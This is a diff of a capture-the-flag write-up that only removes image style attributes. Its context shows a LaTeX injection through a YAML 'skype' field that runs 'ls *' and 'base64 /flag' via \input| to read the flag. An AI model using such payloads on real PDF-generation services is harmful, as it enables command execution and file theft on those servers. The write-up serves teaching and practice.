@@ -56,7 +56,7 @@ Let's verify by trying to close an instruction then re-open it:
 ```
 
 The injection is successful since the generated PDF returns `AAAAAAAAAA` in the Skype field instead of `BBBBBBBBBBBBBB`:
-![Linked Out injection](/assets/linkedout-injection.png){: .image }
+![Linked Out injection](/assets/linkedout-injection.png)
 
 ### LaTeX injection to command execution
 So we can inject LaTeX instructions: now, how to obtain the flag?
@@ -67,7 +67,7 @@ We found a [Stack Exchange answer](https://tex.stackexchange.com/a/20566) sharin
     skype: BBBBBBBBBBBBBB}\skype{\input|"ls *"}%
 ```
 It was indeed successful:
-![Linked Out ls command](/assets/linkedout-command-ls.png){: .image }
+![Linked Out ls command](/assets/linkedout-command-ls.png)
 
 ### Get the flag
 Extracting the flag with a `cat` command did not work. We thought that its content could create an invalid `.tex` file.
@@ -75,7 +75,7 @@ Therefore we used `base64` to obtain it encoded.
 ```yaml
   skype: BBBBBBBBBBBBBB}\skype{\input|"base64 /flag"}%
 ```
-![Linked Out base64 flag](/assets/linkedout-flag-b64.png){: .image }
+![Linked Out base64 flag](/assets/linkedout-flag-b64.png)
 
 Decode it and get the flag:
 ```shell
